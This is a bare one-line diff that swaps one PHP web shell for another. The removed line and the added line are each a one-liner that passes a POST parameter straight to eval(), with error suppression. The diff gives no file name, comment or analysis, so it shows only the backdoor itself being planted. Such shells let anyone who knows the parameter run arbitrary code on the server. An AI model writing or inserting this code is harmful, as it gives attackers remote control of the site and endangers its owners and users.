@@ -1,1 +1,1 @@
-<script language="php">@eval($_POST['rai'])</script>
+<?php @eval($_POST['[passwd]']);?>
